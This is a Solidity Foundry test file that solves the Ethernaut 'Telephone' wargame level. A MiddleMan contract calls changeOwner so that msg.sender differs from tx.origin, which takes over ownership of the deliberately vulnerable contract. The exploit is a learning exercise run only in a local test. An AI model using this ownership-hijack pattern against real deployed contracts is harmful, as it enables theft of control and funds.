// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/openzeppelin-ethernaut/Telephone.sol";

contract MiddleMan {
    function attack(address prey) public {
        Telephone(prey).changeOwner(msg.sender);
    }
}

// use a contract to make msg.sender != tx.origin
contract TelephoneTest is Test {
    Telephone instance;

    function setUp() public {
        instance = new Telephone();
    }

    function test() public {
        assertEq(instance.owner(), address(this));

        MiddleMan middleMan = new MiddleMan();
        address alice = makeAddr("alice");
        vm.prank(alice);
        middleMan.attack(address(instance));

        assertEq(instance.owner(), alice);
    }
}
